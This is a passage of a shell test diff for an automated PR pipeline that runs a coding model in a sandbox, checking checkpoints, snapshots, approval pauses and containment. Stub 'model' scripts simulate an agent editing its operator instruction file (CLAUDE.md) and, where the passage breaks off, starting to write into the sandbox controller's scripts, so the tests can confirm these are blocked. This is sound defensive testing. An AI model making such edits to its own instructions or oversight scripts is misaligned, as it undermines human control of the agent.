+      && grep -q 'Approve 10 more minutes' "$TMP_DIR/checkpoint-curl-args" \
+      && echo 0 || echo 1)
+
+# The pause note replaces progress_note wholesale, so it has to carry forward
+# every durable marker the rest of the system reads out of that field.
+cat > "$TMP_DIR/checkpoint-card-with-note.json" <<'EOF'
+{"task_id":"11112222-0000-4000-8000-000000000011","id8":"11112222","project_id":"dddddddd-0000-4000-8000-000000000004","progress_note":"🤖 AUTO SETUP · BLOCKED: AWAITING ANSWERS · build 550 · prod abc · PR #7 · 🟡 C42 · [autopr:directives draft_pr] · note: n\nAnswers needed — reply below with the numbered choices:\n1. Which term is canonical?"}
+EOF
+: > "$TMP_DIR/preserved-curl-args"
+PATH="$TMP_DIR/bin:$PATH" MATCHA_AUTOPR_ENV="$env_file" \
+    AUTOPR_TEST_CURL_ARGS="$TMP_DIR/preserved-curl-args" \
+    AUTOPR_WORKSPACE_ROOT="$SANDBOX_TEST_REPO" \
+    AUTOPR_SANDBOX_RUNTIME_ROOT="$CHECKPOINT_RUNTIME" \
+    AUTOPR_CHECKPOINT_ROOT="$TMP_DIR/checkpoints" \
+    AUTOPR_LIVE_LOG="$TMP_DIR/checkpoint-live.log" \
+    AUTOPR_SANDBOX_TEST_DIRECT=1 GITHUB_RUN_ID=preserve-test \
+    "$AUTOPR_DIR/checkpoint.sh" save "$TMP_DIR/checkpoint-card-with-note.json" \
+    "$TMP_DIR/missing-report" "$TMP_DIR/missing-decision" "$timeout_started_at" 20 >/dev/null
+check "the pause note keeps the standing directive grant and the pending questions" \
+    $(grep -q 'autopr:directives draft_pr' "$TMP_DIR/preserved-curl-args" \
+      && grep -q 'Which term is canonical' "$TMP_DIR/preserved-curl-args" \
+      && grep -q 'PAUSED: APPROVE 10 MORE MINUTES' "$TMP_DIR/preserved-curl-args" \
+      && echo 0 || echo 1)
+
+# A harness or model failure is not a legitimate conclusion: it must never
+# write the marker that blocks the card behind a human approval.
+cat > "$TMP_DIR/crash-card.json" <<'EOF'
+{"task_id":"22223333-0000-4000-8000-000000000022","id8":"22223333","project_id":"dddddddd-0000-4000-8000-000000000004"}
+EOF
+cat > "$TMP_DIR/signal-card.json" <<'EOF'
+{"task_id":"33334444-0000-4000-8000-000000000033","id8":"33334444","project_id":"dddddddd-0000-4000-8000-000000000004"}
+EOF
+: > "$TMP_DIR/crash-curl-args"
+printf '1\n' > "$TMP_DIR/investigation-exit-code"
+crash_checkpoint_path="$(PATH="$TMP_DIR/bin:$PATH" MATCHA_AUTOPR_ENV="$env_file" \
+    AUTOPR_TEST_CURL_ARGS="$TMP_DIR/crash-curl-args" \
+    AUTOPR_INVESTIGATION_EXIT_FILE="$TMP_DIR/investigation-exit-code" \
+    AUTOPR_WORKSPACE_ROOT="$SANDBOX_TEST_REPO" \
+    AUTOPR_SANDBOX_RUNTIME_ROOT="$CHECKPOINT_RUNTIME" \
+    AUTOPR_CHECKPOINT_ROOT="$TMP_DIR/checkpoints" \
+    AUTOPR_LIVE_LOG="$TMP_DIR/checkpoint-live.log" \
+    AUTOPR_SANDBOX_TEST_DIRECT=1 GITHUB_RUN_ID=crash-test \
+    "$AUTOPR_DIR/checkpoint.sh" save "$TMP_DIR/crash-card.json" \
+    "$TMP_DIR/missing-report" "$TMP_DIR/missing-decision" "$timeout_started_at" 20)"
+check "a crash inside the time limit checkpoints without pausing the card" \
+    $(jq -e '.runtime_limited == false' "$crash_checkpoint_path/metadata.json" >/dev/null \
+      && [ ! -s "$TMP_DIR/crash-curl-args" ] \
+      && echo 0 || echo 1)
+
+# A killed run either leaves no status behind or reports a signal.
+printf '143\n' > "$TMP_DIR/investigation-exit-code"
+signal_checkpoint_path="$(PATH="$TMP_DIR/bin:$PATH" MATCHA_AUTOPR_ENV="$env_file" \
+    AUTOPR_TEST_CURL_ARGS="$TMP_DIR/signal-curl-args" \
+    AUTOPR_INVESTIGATION_EXIT_FILE="$TMP_DIR/investigation-exit-code" \
+    AUTOPR_WORKSPACE_ROOT="$SANDBOX_TEST_REPO" \
+    AUTOPR_SANDBOX_RUNTIME_ROOT="$CHECKPOINT_RUNTIME" \
+    AUTOPR_CHECKPOINT_ROOT="$TMP_DIR/checkpoints" \
+    AUTOPR_LIVE_LOG="$TMP_DIR/checkpoint-live.log" \
+    AUTOPR_SANDBOX_TEST_DIRECT=1 GITHUB_RUN_ID=signal-test \
+    "$AUTOPR_DIR/checkpoint.sh" save "$TMP_DIR/signal-card.json" \
+    "$TMP_DIR/missing-report" "$TMP_DIR/missing-decision" "$timeout_started_at" 20)"
+check "a signal-killed investigation still pauses for approval" \
+    $(jq -e '.runtime_limited == true' "$signal_checkpoint_path/metadata.json" >/dev/null \
+      && echo 0 || echo 1)
+rm -f "$TMP_DIR/investigation-exit-code"
+
+# A workspace left behind by another card must never be harvested: its patch
+# would reach the wrong PR.
+cat > "$TMP_DIR/foreign-card.json" <<'EOF'
+{"task_id":"eeeeeeee-0000-4000-8000-000000000005","id8":"eeeeeeee","project_id":"dddddddd-0000-4000-8000-000000000004"}
+EOF
+foreign_checkpoint_path="$(PATH="$TMP_DIR/bin:$PATH" MATCHA_AUTOPR_ENV="$env_file" \
+    AUTOPR_WORKSPACE_ROOT="$SANDBOX_TEST_REPO" \
+    AUTOPR_SANDBOX_RUNTIME_ROOT="$CHECKPOINT_RUNTIME" \
+    AUTOPR_CHECKPOINT_ROOT="$TMP_DIR/checkpoints" \
+    AUTOPR_LIVE_LOG="$TMP_DIR/checkpoint-live.log" \
+    AUTOPR_SANDBOX_TEST_DIRECT=1 GITHUB_RUN_ID=foreign-test \
+    "$AUTOPR_DIR/checkpoint.sh" save "$TMP_DIR/foreign-card.json" \
+    "$TMP_DIR/missing-report" "$TMP_DIR/missing-decision" "$(date +%s)" 20 2>/dev/null)"
+check "a sandbox left over from another card is never checkpointed as this one" \
+    $(jq -e '.patch_saved == false and .changed_file_count == 0' \
+        "$foreign_checkpoint_path/metadata.json" >/dev/null \
+      && [ ! -e "$foreign_checkpoint_path/model.patch" ] \
+      && echo 0 || echo 1)
+
+cat > "$TMP_DIR/prune-card.json" <<'EOF'
+{"task_id":"44445555-0000-4000-8000-000000000044","id8":"44445555","project_id":"dddddddd-0000-4000-8000-000000000004"}
+EOF
+for prune_run in prune-1 prune-2 prune-3; do
+    PATH="$TMP_DIR/bin:$PATH" MATCHA_AUTOPR_ENV="$env_file" \
+        AUTOPR_WORKSPACE_ROOT="$SANDBOX_TEST_REPO" \
+        AUTOPR_SANDBOX_RUNTIME_ROOT="$CHECKPOINT_RUNTIME" \
+        AUTOPR_CHECKPOINT_ROOT="$TMP_DIR/checkpoints" \
+        AUTOPR_CHECKPOINT_MAX_PER_TASK=2 \
+        AUTOPR_LIVE_LOG="$TMP_DIR/checkpoint-live.log" \
+        AUTOPR_SANDBOX_TEST_DIRECT=1 GITHUB_RUN_ID="$prune_run" \
+        "$AUTOPR_DIR/checkpoint.sh" save "$TMP_DIR/prune-card.json" \
+        "$TMP_DIR/missing-report" "$TMP_DIR/missing-decision" "$(date +%s)" 20 \
+        >/dev/null 2>&1
+    sleep 1
+done
+# Two under the cap plus the one `active` names, which is exempt: pruning it
+# would delete the only resumable work while the pointer still names it.
+check "checkpoints are bounded instead of accumulating under .git forever" \
+    $([ "$(find "$TMP_DIR/checkpoints/44445555-0000-4000-8000-000000000044" \
+        -mindepth 1 -maxdepth 1 -type d | wc -l | tr -d '[:space:]')" = 3 ] \
+      && echo 0 || echo 1)
+
+check "the resumed transcript stays small enough to leave the model room to work" \
+    $(grep -qF 'AUTOPR_CHECKPOINT_MAX_TRANSCRIPT_BYTES:-131072' "$AUTOPR_DIR/checkpoint.sh" \
+      && [ "$(wc -c < "$checkpoint_path/transcript.log" | tr -d '[:space:]')" -le 131072 ] \
+      && echo 0 || echo 1)
+
+# checkpoint.sh save only runs as its own workflow step. A hard kill (machine
+# death, SIGKILL, Docker restart) skips it entirely and the next run wipes the
+# sandbox, so the investigation snapshots itself on a timer while the model
+# still holds the workspace.
+SNAPSHOT_RUNTIME="$TMP_DIR/snapshot-runtime"
+mkdir -p "$SNAPSHOT_RUNTIME"
+git clone --quiet "$SANDBOX_TEST_REPO" "$SNAPSHOT_RUNTIME/workspace"
+snapshot_base="$(git -C "$SNAPSHOT_RUNTIME/workspace" rev-parse HEAD)"
+mkdir -p "$SNAPSHOT_RUNTIME/workspace/.git/autopr-io/output"
+printf '%s\n' "$snapshot_base" \
+    > "$SNAPSHOT_RUNTIME/workspace/.git/autopr-io/model-base-sha"
+printf '55556666-0000-4000-8000-000000000055\n' \
+    > "$SNAPSHOT_RUNTIME/workspace/.git/autopr-io/task-id"
+printf 'export const inflight = true;\n' \
+    > "$SNAPSHOT_RUNTIME/workspace/client/src/inflight.ts"
+printf '%s\n' '### Summary' 'still working' \
+    > "$SNAPSHOT_RUNTIME/workspace/.git/autopr-io/output/report.md"
+cat > "$TMP_DIR/snapshot-card.json" <<'EOF'
+{"task_id":"55556666-0000-4000-8000-000000000055","id8":"55556666","project_id":"dddddddd-0000-4000-8000-000000000004"}
+EOF
+snapshot_index_before="$(shasum "$SNAPSHOT_RUNTIME/workspace/.git/index" | cut -d' ' -f1)"
+snapshot_dir="$(AUTOPR_WORKSPACE_ROOT="$SANDBOX_TEST_REPO" \
+    AUTOPR_SANDBOX_RUNTIME_ROOT="$SNAPSHOT_RUNTIME" \
+    AUTOPR_CHECKPOINT_ROOT="$TMP_DIR/checkpoints" \
+    AUTOPR_LIVE_LOG="$TMP_DIR/checkpoint-live.log" \
+    AUTOPR_SNAPSHOT_SETTLE_SECONDS=0 \
+    GITHUB_RUN_ID=snapshot-test \
+    "$AUTOPR_DIR/checkpoint.sh" snapshot "$TMP_DIR/snapshot-card.json")"
+snapshot_latest="$(AUTOPR_WORKSPACE_ROOT="$SANDBOX_TEST_REPO" \
+    AUTOPR_CHECKPOINT_ROOT="$TMP_DIR/checkpoints" \
+    "$AUTOPR_DIR/checkpoint.sh" latest "$TMP_DIR/snapshot-card.json")"
+snapshot_index_after="$(shasum "$SNAPSHOT_RUNTIME/workspace/.git/index" | cut -d' ' -f1)"
+check "an in-flight snapshot captures live model work and becomes resumable" \
+    $([ -n "$snapshot_dir" ] && [ "$snapshot_dir" = "$snapshot_latest" ] \
+      && grep -q 'inflight.ts' "$snapshot_dir/model.patch" \
+      && git -C "$SANDBOX_TEST_REPO" apply --check --binary "$snapshot_dir/model.patch" \
+      && jq -e '.inflight == true and .patch_saved == true and .report_saved == true' \
+        "$snapshot_dir/metadata.json" >/dev/null \
+      && echo 0 || echo 1)
+
+check "snapshots never fight the live container for its git index" \
+    $([ "$snapshot_index_before" = "$snapshot_index_after" ] \
+      && [ -f "$SNAPSHOT_RUNTIME/snapshot.index" ] \
+      && echo 0 || echo 1)
+
+# A file the model is still streaming into would be captured truncated, and
+# `git apply --check` on the resume would accept it.
+printf 'export const unsettled = true;\n' \
+    > "$SNAPSHOT_RUNTIME/workspace/client/src/unsettled.ts"
+unsettled_pass="$(AUTOPR_WORKSPACE_ROOT="$SANDBOX_TEST_REPO" \
+    AUTOPR_SANDBOX_RUNTIME_ROOT="$SNAPSHOT_RUNTIME" \
+    AUTOPR_CHECKPOINT_ROOT="$TMP_DIR/checkpoints" \
+    AUTOPR_LIVE_LOG="$TMP_DIR/checkpoint-live.log" \
+    AUTOPR_SNAPSHOT_SETTLE_SECONDS=60 \
+    GITHUB_RUN_ID=snapshot-test \
+    "$AUTOPR_DIR/checkpoint.sh" snapshot "$TMP_DIR/snapshot-card.json")"
+check "a snapshot skips a workspace the model is still writing" \
+    $([ -z "$unsettled_pass" ] \
+      && ! grep -q 'unsettled.ts' "$snapshot_dir/model.patch" \
+      && echo 0 || echo 1)
+
+# But never skips forever: a possibly-unsettled patch beats losing the run.
+forced_pass="$(AUTOPR_WORKSPACE_ROOT="$SANDBOX_TEST_REPO" \
+    AUTOPR_SANDBOX_RUNTIME_ROOT="$SNAPSHOT_RUNTIME" \
+    AUTOPR_CHECKPOINT_ROOT="$TMP_DIR/checkpoints" \
+    AUTOPR_LIVE_LOG="$TMP_DIR/checkpoint-live.log" \
+    AUTOPR_SNAPSHOT_SETTLE_SECONDS=60 AUTOPR_SNAPSHOT_MAX_UNSETTLED_SKIPS=0 \
+    GITHUB_RUN_ID=snapshot-test \
+    "$AUTOPR_DIR/checkpoint.sh" snapshot "$TMP_DIR/snapshot-card.json")"
+check "an unsettled workspace is still checkpointed rather than skipped forever" \
+    $([ "$forced_pass" = "$snapshot_dir" ] \
+      && grep -q 'unsettled.ts' "$snapshot_dir/model.patch" \
+      && jq -e '.settled == false' "$snapshot_dir/metadata.json" >/dev/null \
+      && echo 0 || echo 1)
+rm -f "$SNAPSHOT_RUNTIME/workspace/client/src/unsettled.ts"
+
+snapshot_foreign="$(AUTOPR_WORKSPACE_ROOT="$SANDBOX_TEST_REPO" \
+    AUTOPR_SANDBOX_RUNTIME_ROOT="$SNAPSHOT_RUNTIME" \
+    AUTOPR_CHECKPOINT_ROOT="$TMP_DIR/checkpoints" \
+    AUTOPR_LIVE_LOG="$TMP_DIR/checkpoint-live.log" \
+    AUTOPR_SNAPSHOT_SETTLE_SECONDS=0 \
+    GITHUB_RUN_ID=snapshot-test \
+    "$AUTOPR_DIR/checkpoint.sh" snapshot "$TMP_DIR/foreign-card.json")"
+check "an in-flight snapshot refuses a sandbox belonging to another card" \
+    $([ -z "$snapshot_foreign" ] && echo 0 || echo 1)
+
+# The pointer is the whole value of a snapshot: an empty later save must not
+# take it away.
+empty_save_path="$(PATH="$TMP_DIR/bin:$PATH" MATCHA_AUTOPR_ENV="$env_file" \
+    AUTOPR_WORKSPACE_ROOT="$SANDBOX_TEST_REPO" \
+    AUTOPR_SANDBOX_RUNTIME_ROOT="$CHECKPOINT_RUNTIME" \
+    AUTOPR_CHECKPOINT_ROOT="$TMP_DIR/checkpoints" \
+    AUTOPR_LIVE_LOG="$TMP_DIR/checkpoint-live.log" \
+    AUTOPR_SANDBOX_TEST_DIRECT=1 GITHUB_RUN_ID=empty-save-test \
+    "$AUTOPR_DIR/checkpoint.sh" save "$TMP_DIR/snapshot-card.json" \
+    "$TMP_DIR/missing-report" "$TMP_DIR/missing-decision" "$(date +%s)" 20 2>/dev/null)"
+still_resumable="$(AUTOPR_WORKSPACE_ROOT="$SANDBOX_TEST_REPO" \
+    AUTOPR_CHECKPOINT_ROOT="$TMP_DIR/checkpoints" \
+    "$AUTOPR_DIR/checkpoint.sh" latest "$TMP_DIR/snapshot-card.json")"
+check "an empty save never steals the resume pointer from real saved work" \
+    $([ -n "$empty_save_path" ] && [ "$still_resumable" = "$snapshot_dir" ] \
+      && echo 0 || echo 1)
+
+# A pass that started a second before `consume` must not survive it: killing the
+# timer only kills the sleeping subshell, so the halt has to WAIT for the pass.
+mkdir -p "$SNAPSHOT_RUNTIME/snapshot.lock"
+halt_started="$(date +%s)"
+( sleep 2; rmdir "$SNAPSHOT_RUNTIME/snapshot.lock" ) &
+halt_waiter=$!
+AUTOPR_WORKSPACE_ROOT="$SANDBOX_TEST_REPO" \
+    AUTOPR_SANDBOX_RUNTIME_ROOT="$SNAPSHOT_RUNTIME" \
+    AUTOPR_CHECKPOINT_ROOT="$TMP_DIR/checkpoints" \
+    AUTOPR_SNAPSHOT_HALT_WAIT_SECONDS=20 \
+    "$AUTOPR_DIR/checkpoint.sh" snapshot-halt
+halt_elapsed=$(( $(date +%s) - halt_started ))
+wait "$halt_waiter" 2>/dev/null || true
+check "halting snapshots waits for a pass that is already running" \
+    $([ "$halt_elapsed" -ge 2 ] && [ ! -d "$SNAPSHOT_RUNTIME/snapshot.lock" ] \
+      && echo 0 || echo 1)
+
+# After the halt, a late pass must be a no-op rather than re-pointing `active`.
+printf 'export const late = true;\n' \
+    > "$SNAPSHOT_RUNTIME/workspace/client/src/late.ts"
+halted_pass="$(AUTOPR_WORKSPACE_ROOT="$SANDBOX_TEST_REPO" \
+    AUTOPR_SANDBOX_RUNTIME_ROOT="$SNAPSHOT_RUNTIME" \
+    AUTOPR_CHECKPOINT_ROOT="$TMP_DIR/checkpoints" \
+    AUTOPR_LIVE_LOG="$TMP_DIR/checkpoint-live.log" \
+    AUTOPR_SNAPSHOT_SETTLE_SECONDS=0 \
+    GITHUB_RUN_ID=snapshot-test \
+    "$AUTOPR_DIR/checkpoint.sh" snapshot "$TMP_DIR/snapshot-card.json")"
+check "a snapshot pass that lands after the halt writes nothing" \
+    $([ -z "$halted_pass" ] \
+      && ! grep -q 'late.ts' "$snapshot_dir/model.patch" \
+      && echo 0 || echo 1)
+
+AUTOPR_WORKSPACE_ROOT="$SANDBOX_TEST_REPO" \
+    AUTOPR_SANDBOX_RUNTIME_ROOT="$SNAPSHOT_RUNTIME" \
+    "$AUTOPR_DIR/checkpoint.sh" snapshot-arm
+rearmed_pass="$(AUTOPR_WORKSPACE_ROOT="$SANDBOX_TEST_REPO" \
+    AUTOPR_SANDBOX_RUNTIME_ROOT="$SNAPSHOT_RUNTIME" \
+    AUTOPR_CHECKPOINT_ROOT="$TMP_DIR/checkpoints" \
+    AUTOPR_LIVE_LOG="$TMP_DIR/checkpoint-live.log" \
+    AUTOPR_SNAPSHOT_SETTLE_SECONDS=0 \
+    GITHUB_RUN_ID=snapshot-test \
+    "$AUTOPR_DIR/checkpoint.sh" snapshot "$TMP_DIR/snapshot-card.json")"
+check "arming the next run re-enables snapshots" \
+    $([ "$rearmed_pass" = "$snapshot_dir" ] \
+      && grep -q 'late.ts' "$snapshot_dir/model.patch" \
+      && echo 0 || echo 1)
+
+# The tree goes clean (the directive-violation retry resets it). The previous
+# pass's patch must not stay on disk as this checkpoint's resume patch.
+rm -f "$SNAPSHOT_RUNTIME/workspace/client/src/inflight.ts" \
+    "$SNAPSHOT_RUNTIME/workspace/client/src/late.ts"
+AUTOPR_WORKSPACE_ROOT="$SANDBOX_TEST_REPO" \
+    AUTOPR_SANDBOX_RUNTIME_ROOT="$SNAPSHOT_RUNTIME" \
+    AUTOPR_CHECKPOINT_ROOT="$TMP_DIR/checkpoints" \
+    AUTOPR_LIVE_LOG="$TMP_DIR/checkpoint-live.log" \
+    AUTOPR_SNAPSHOT_SETTLE_SECONDS=0 \
+    GITHUB_RUN_ID=snapshot-test \
+    "$AUTOPR_DIR/checkpoint.sh" snapshot "$TMP_DIR/snapshot-card.json" >/dev/null
+check "a pass with nothing to save drops the previous pass's stale patch" \
+    $([ ! -e "$snapshot_dir/model.patch" ] \
+      && jq -e '.patch_saved == false' "$snapshot_dir/metadata.json" >/dev/null \
+      && echo 0 || echo 1)
+
+# A rework of the SAME card finds the previous round's clone still stamped with
+# this task id. Only the clone's age tells the two rounds apart.
+printf 'export const inflight = true;\n' \
+    > "$SNAPSHOT_RUNTIME/workspace/client/src/inflight.ts"
+printf '%s\n' "$(( $(date +%s) + 120 ))" > "$TMP_DIR/started-in-the-future"
+stale_clone_pass="$(AUTOPR_WORKSPACE_ROOT="$SANDBOX_TEST_REPO" \
+    AUTOPR_SANDBOX_RUNTIME_ROOT="$SNAPSHOT_RUNTIME" \
+    AUTOPR_CHECKPOINT_ROOT="$TMP_DIR/checkpoints" \
+    AUTOPR_LIVE_LOG="$TMP_DIR/checkpoint-live.log" \
+    AUTOPR_INVESTIGATION_STARTED_FILE="$TMP_DIR/started-in-the-future" \
+    AUTOPR_SNAPSHOT_SETTLE_SECONDS=0 \
+    GITHUB_RUN_ID=snapshot-test \
+    "$AUTOPR_DIR/checkpoint.sh" snapshot "$TMP_DIR/snapshot-card.json")"
+check "a snapshot refuses a sandbox clone left over from a previous round" \
+    $([ -z "$stale_clone_pass" ] \
+      && [ ! -e "$snapshot_dir/model.patch" ] \
+      && echo 0 || echo 1)
+
+# The timer itself: the real loop out of investigate.sh, orphaned by its parent.
+sed -n '/^start_inflight_snapshots() {/,/^}/p' "$AUTOPR_DIR/investigate.sh" \
+    > "$TMP_DIR/snapshot-timer.sh"
+cat > "$TMP_DIR/timer-parent.sh" <<EOF
+#!/usr/bin/env bash
+set -uo pipefail
+SCRIPT_DIR="$AUTOPR_DIR"
+CARD_FILE="$TMP_DIR/timer-card.json"
+SNAPSHOT_INTERVAL_SECONDS=1
+SNAPSHOT_MAX_PASSES=30
+SNAPSHOT_PID=""
+source "$TMP_DIR/snapshot-timer.sh"
+start_inflight_snapshots
+printf '%s\n' "\$SNAPSHOT_PID"
+EOF
+chmod +x "$TMP_DIR/timer-parent.sh"
+cat > "$TMP_DIR/timer-card.json" <<'EOF'
+{"task_id":"66667777-0000-4000-8000-000000000066","id8":"66667777","project_id":"dddddddd-0000-4000-8000-000000000004"}
+EOF
+timer_root="$TMP_DIR/checkpoints/66667777-0000-4000-8000-000000000066"
+timer_pid="$(AUTOPR_WORKSPACE_ROOT="$SANDBOX_TEST_REPO" \
+    AUTOPR_SANDBOX_RUNTIME_ROOT="$SNAPSHOT_RUNTIME" \
+    AUTOPR_CHECKPOINT_ROOT="$TMP_DIR/checkpoints" \
+    "$TMP_DIR/timer-parent.sh" 2>/dev/null)"
+sleep 3
+check "an orphaned snapshot timer stops instead of outliving its investigation" \
+    $(! kill -0 "$timer_pid" 2>/dev/null && [ ! -d "$timer_root" ] \
+      && echo 0 || echo 1)
+
+# Pruning must never evict the checkpoint `active` names, or the empty-save
+# guard protects a directory that pruning has already deleted.
+prune_active_root="$TMP_DIR/checkpoints/77778888-0000-4000-8000-000000000077"
+cat > "$TMP_DIR/prune-active-card.json" <<'EOF'
+{"task_id":"77778888-0000-4000-8000-000000000077","id8":"77778888","project_id":"dddddddd-0000-4000-8000-000000000004"}
+EOF
+mkdir -p "$prune_active_root/oldest-inflight"
+printf 'patch\n' > "$prune_active_root/oldest-inflight/model.patch"
+jq -n --arg created "$(date -u +%Y-%m-%dT%H:%M:%SZ)" \
+    '{schema_version:1,created_at:$created,patch_saved:true}' \
+    > "$prune_active_root/oldest-inflight/metadata.json"
+printf 'oldest-inflight\n' > "$prune_active_root/active"
+for newer in newer-1 newer-2 newer-3; do
+    sleep 1
+    mkdir -p "$prune_active_root/$newer"
+done
+PATH="$TMP_DIR/bin:$PATH" MATCHA_AUTOPR_ENV="$env_file" \
+    AUTOPR_WORKSPACE_ROOT="$SANDBOX_TEST_REPO" \
+    AUTOPR_SANDBOX_RUNTIME_ROOT="$CHECKPOINT_RUNTIME" \
+    AUTOPR_CHECKPOINT_ROOT="$TMP_DIR/checkpoints" \
+    AUTOPR_CHECKPOINT_MAX_PER_TASK=1 \
+    AUTOPR_LIVE_LOG="$TMP_DIR/checkpoint-live.log" \
+    AUTOPR_SANDBOX_TEST_DIRECT=1 GITHUB_RUN_ID=prune-active-test \
+    "$AUTOPR_DIR/checkpoint.sh" save "$TMP_DIR/prune-active-card.json" \
+    "$TMP_DIR/missing-report" "$TMP_DIR/missing-decision" "$(date +%s)" 20 \
+    >/dev/null 2>&1
+prune_active_latest="$(AUTOPR_WORKSPACE_ROOT="$SANDBOX_TEST_REPO" \
+    AUTOPR_CHECKPOINT_ROOT="$TMP_DIR/checkpoints" \
+    "$AUTOPR_DIR/checkpoint.sh" latest "$TMP_DIR/prune-active-card.json")"
+check "pruning never deletes the checkpoint the active pointer names" \
+    $([ -d "$prune_active_root/oldest-inflight" ] \
+      && [ "$prune_active_latest" = "$prune_active_root/oldest-inflight" ] \
+      && echo 0 || echo 1)
+
+cat > "$TMP_DIR/bin/codex" <<'EOF'
+#!/usr/bin/env bash
+prompt="${!#}"
+report_path="$(printf '%s\n' "$prompt" | sed -n 's/^REPORT=//p')"
+decision_path="$(printf '%s\n' "$prompt" | sed -n 's/^DECISION=//p')"
+first_input="$(printf '%s\n' "$prompt" | sed -n \
+    '/^AUTOPR_INPUTS_BEGIN$/,/^AUTOPR_INPUTS_END$/ { s/^- //p; }' | head -1)"
+workspace=""
+args=("$@")
+for ((i = 0; i < ${#args[@]}; i++)); do
+    [ "${args[$i]}" != -C ] || workspace="${args[$((i + 1))]}"
+done
+cd "$workspace"
+[ ! -e secrets/private.pem ] || exit 31
+[ -z "$(git remote)" ] || exit 32
+cp "$first_input" "$AUTOPR_SANDBOX_CAPTURE_CONTEXT"
+mkdir -p "$(dirname "$report_path")" "$(dirname "$decision_path")" client/src
+printf '%s\n' '### Summary' sandbox '### Changes' sandbox '### Blast radius' none '### Confidence' high > "$report_path"
+printf '%s\n' '{"schema_version":1,"outcome":"implementation"}' > "$decision_path"
+printf 'export const sandboxProbe = true;\n' > client/src/sandbox-probe.ts
+printf 'model note\n' >> server/app/matcha/services/huume/CLAUDE.md
+EOF
+chmod +x "$TMP_DIR/bin/codex"
+
+printf '%s\n' 'REPORT=REPORT_PATH' 'DECISION=DECISION_PATH' > "$TMP_DIR/sandbox-prompt.txt"
+printf 'attachment\n' > "$TMP_DIR/sandbox-attachment.txt"
+jq -n --arg path "$TMP_DIR/sandbox-attachment.txt" \
+  '{downloaded_attachments:[{id:"attachment-1",local_path:$path}]}' > "$TMP_DIR/sandbox-context.json"
+
+PATH="$TMP_DIR/bin:$PATH" AUTOPR_SANDBOX_TEST_DIRECT=1 \
+AUTOPR_SANDBOX_REPO_ROOT="$SANDBOX_TEST_REPO" \
+AUTOPR_SANDBOX_RUNTIME_ROOT="$TMP_DIR/sandbox-runtime" \
+AUTOPR_RESUME_PATCH="$checkpoint_path/model.patch" \
+AUTOPR_SANDBOX_CAPTURE_CONTEXT="$TMP_DIR/sandbox-captured-context.json" \
+  "$AUTOPR_DIR/run-codex-sandboxed.sh" "$TMP_DIR/sandbox-prompt.txt" \
+  "$TMP_DIR/sandbox-report.md" "$TMP_DIR/sandbox-decision.json" \
+  -f "$TMP_DIR/sandbox-context.json" -f "$TMP_DIR/sandbox-attachment.txt" \
+  >"$TMP_DIR/sandbox-bridge.log" 2>&1
+sandbox_bridge_rc=$?
+[ "$sandbox_bridge_rc" = 0 ] || sed -n '1,120p' "$TMP_DIR/sandbox-bridge.log"
+
+check "msandbox bridge excludes secrets and instruction edits while applying the product patch" \
+    $([ "$sandbox_bridge_rc" = 0 ] \
+      && grep -q 'sandboxProbe' "$SANDBOX_TEST_REPO/client/src/sandbox-probe.ts" \
+      && grep -q 'recovered' "$SANDBOX_TEST_REPO/client/src/recovered.ts" \
+      && [ "$(cat "$SANDBOX_TEST_REPO/server/app/matcha/services/huume/CLAUDE.md")" = "operator instructions" ] \
+      && grep -q 'Ignored model edit to operator instruction file' "$TMP_DIR/sandbox-bridge.log" \
+      && [ -s "$TMP_DIR/sandbox-report.md" ] \
+      && [ ! -e "$SANDBOX_TEST_REPO/.autopr-io" ] \
+      && echo 0 || echo 1)
+
+AUTOPR_WORKSPACE_ROOT="$SANDBOX_TEST_REPO" \
+AUTOPR_CHECKPOINT_ROOT="$TMP_DIR/checkpoints" \
+    "$AUTOPR_DIR/checkpoint.sh" consume "$TMP_DIR/checkpoint-card.json"
+consumed_checkpoint="$(AUTOPR_WORKSPACE_ROOT="$SANDBOX_TEST_REPO" \
+    AUTOPR_CHECKPOINT_ROOT="$TMP_DIR/checkpoints" \
+    "$AUTOPR_DIR/checkpoint.sh" latest "$TMP_DIR/checkpoint-card.json")"
+check "a completed retry deactivates but does not delete its saved checkpoint" \
+    $([ -z "$consumed_checkpoint" ] && [ -d "$checkpoint_path" ] && echo 0 || echo 1)
+
+mapped_attachment="$(jq -r '.downloaded_attachments[0].local_path' "$TMP_DIR/sandbox-captured-context.json" 2>/dev/null)"
+check "msandbox bridge rewrites attachment paths into the isolated workspace" \
+    $([ -n "$mapped_attachment" ] \
+      && [ "$mapped_attachment" != "$TMP_DIR/sandbox-attachment.txt" ] \
+      && [[ "$mapped_attachment" == "$TMP_DIR/sandbox-runtime/workspace/"* ]] \
+      && echo 0 || echo 1)
+
+rm -f "$SANDBOX_TEST_REPO/client/src/sandbox-probe.ts"
+PATH="$TMP_DIR/bin:$PATH" AUTOPR_SANDBOX_TEST_DIRECT=1 \
+AUTOPR_SANDBOX_MAX_CHANGED_FILES=0 \
+AUTOPR_SANDBOX_REPO_ROOT="$SANDBOX_TEST_REPO" \
+AUTOPR_SANDBOX_RUNTIME_ROOT="$TMP_DIR/sandbox-runtime" \
+AUTOPR_SANDBOX_CAPTURE_CONTEXT="$TMP_DIR/sandbox-captured-context.json" \
+  "$AUTOPR_DIR/run-codex-sandboxed.sh" "$TMP_DIR/sandbox-prompt.txt" \
+  "$TMP_DIR/sandbox-report-capped.md" "$TMP_DIR/sandbox-decision-capped.json" \
+  -f "$TMP_DIR/sandbox-context.json" -f "$TMP_DIR/sandbox-attachment.txt" \
+  >/dev/null 2>&1
+sandbox_cap_rc=$?
+check "msandbox bridge enforces the mechanical changed-file cap before apply" \
+    $([ "$sandbox_cap_rc" != 0 ] \
+      && [ ! -e "$SANDBOX_TEST_REPO/client/src/sandbox-probe.ts" ] \
+      && echo 0 || echo 1)
+
+# The trusted job keeps executing scripts out of the checkout between this
+# bridge and publish.sh (scope check, coverage, the sandbox controller). A
+# model patch that rewrites one of them must be refused HERE, at apply time.
+mkdir -p "$TMP_DIR/deny-bin"
+cat > "$TMP_DIR/deny-bin/codex" <<'EOF'
+#!/usr/bin/env bash
+prompt="${!#}"
+report_path="$(printf '%s\n' "$prompt" | grep -oE '/[^ ]+/\.git/autopr-io/output/report\.md' | head -1)"
+decision_path="$(printf '%s\n' "$prompt" | grep -oE '/[^ ]+/\.git/autopr-io/output/decision\.json' | head -1)"
+workspace=""; args=("$@")
+for ((i = 0; i < ${#args[@]}; i++)); do [ "${args[$i]}" != -C ] || workspace="${args[$((i + 1))]}"; done
+mkdir -p "$(dirname "$report_path")" "$workspace/apps/msandbox/bin" "$workspace/client/src"
+printf '### Summary\nstub\n' > "$report_path"
